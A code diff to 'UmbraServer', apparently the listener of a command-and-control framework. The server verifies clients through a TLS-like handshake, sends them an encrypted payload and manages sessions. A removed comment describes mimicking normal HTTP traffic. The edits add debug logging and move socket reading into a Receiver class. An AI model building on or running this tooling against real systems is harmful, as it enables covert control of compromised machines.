@@ -1,5 +1,6 @@
 from src.Utilities  import *
 from src.TLS        import *
+from src.Receiver   import *
 from src.Payload    import *
 from src.TextAssets import *
 
@@ -59,6 +60,10 @@ class ClientComponents:
                         cipher                  = self.connection.recv(length)
                         data                    = Payload.decrypt(cipher, self.key)
 
+                        if not data:
+                                self.connection.close()
+                                continue
+
                         if data[0] != 0x03:
                                 continue
 
@@ -96,7 +101,8 @@ class UmbraServer:
                 self.client_manager     = None
                 self.callback_ip        = None
                 self.callback_port      = None
-                self.time               = 2000
+                self.receiver           = Receiver(2000)
+                self.verbosity          = None
 
         @Public.Method
         def startup(self, bind_address: tuple[str, int]) -> bool:
@@ -136,8 +142,11 @@ class UmbraServer:
                         try:
                                 client, address = listener.accept()
                         except Exception as exception:
-                                debug("Exception: {}".format(exception))
+                                error("Exception: {}".format(exception), self.quick_check())
                                 break
+
+                        if self.verbosity:
+                                debug("Connect from [{}] {}.".format(address[0], address[1]), self.quick_check())
 
                         client_verifier = threading.Thread(
                                 target  = self.verify,
@@ -157,27 +166,44 @@ class UmbraServer:
                 client.setblocking(False)
                 client_key              = random.randbytes(1024)
 
+                if self.verbosity:
+                        debug("Peeking at client connection.", self.quick_check())
+
                 if not self.peek(client):
+                        if self.verbosity:
+                                debug("Client did not send information.", self.quick_check())
+
                         client.close()
                         return
+
+                if self.verbosity:
+                        debug("Validating ClientHello.", self.quick_check())
 
                 if not self.valid_request(client):
+                        if self.verbosity:
+                                debug("Client did not send valid request.", self.quick_check())
+
                         client.close()
                         return
 
+                if self.verbosity:
+                        debug("Sending Payload.", self.quick_check())
 
                 if not self.sent_payload(client, client_key):
+                        if self.verbosity:
+                                debug("Client did not respond to payload.", self.quick_check())
+
                         client.close()
                         return
 
-                tls                     = self.recvall(client, 5)
+                tls                     = self.receiver.recvall(client, 5)
 
                 if not tls:
                         client.close()
                         return
 
                 length                  = int.from_bytes(tls[3:])
-                data                    = self.recvall(client, length)
+                data                    = self.receiver.recvall(client, length)
                 data                    = Payload.decrypt(data, client_key)
 
                 struct                  = ClientComponents()
@@ -196,7 +222,7 @@ class UmbraServer:
                 struct.thread.start()
 
                 self.clients[struct.identifier] = struct
-                success("New client [{}] verified. (type 'sessions' for more info)".format(green(struct.identifier)))
+                success("New client [{}] verified. (type 'sessions' for more info)".format(green(struct.identifier)), self.quick_check())
 
         @Private.Method
         def peek(self, connection: socket.socket) -> bool:
@@ -217,7 +243,7 @@ class UmbraServer:
 
         @Private.Method
         def valid_request(self, client: socket.socket) -> bool:
-                request                 = self.recvall(client, 50)
+                request                 = self.receiver.recvall(client, 50)
                 request                 = int.from_bytes(request)
                 request                 = Request(request)
 
@@ -283,9 +309,13 @@ class UmbraServer:
 
                         client.status   = "Lost"
 
-        # Our client will be continuously checking if we have a command to execute.
-        # We want something for our client to digest, while we are not in session
-        # with the client to remain compliant with normal HTTP traffic.
+        @Private.Method
+        def quick_check(self) -> bool:
+                for client_id, client in self.clients.items():
+                        if client.in_use:
+                                return False
+
+                return True
 
         @Public.Method
         def kill(self) -> None:
@@ -294,48 +324,6 @@ class UmbraServer:
 
                 self.server.shutdown    = True
                 self.server.bind_agent.close()
-
-        @Private.Method
-        def recvall(self, client: socket.socket, length: int) -> bytes:
-                data                    = b""
-                timer                   = self.start_timer()
-
-                while True:
-                        if length == 0:
-                                return data
-
-                        if not timer.is_alive():
-                                return data
-                        try:
-                                recv    = client.recv(length)
-                                length -= len(recv)
-                                data   += recv
-                                timer   = self.start_timer()
-                        except BlockingIOError:
-                                continue
-                        except ConnectionResetError:
-                                break
-                        except OSError:
-                                break
-
-                return data
-
-        @Private.Method
-        def start_timer(self) -> threading.Thread:
-                timer                   = threading.Thread(
-                        target          = self.timeout,
-                        args            = (self.time,),
-                        daemon          = True
-                )
-                timer.start()
-
-                return timer
-
-
-        @Public.Method
-        def timeout(self, milliseconds: int) -> None:
-                seconds                 = milliseconds / 1000
-                time.sleep(seconds)
 
 def main() -> None:
         server = UmbraServer()
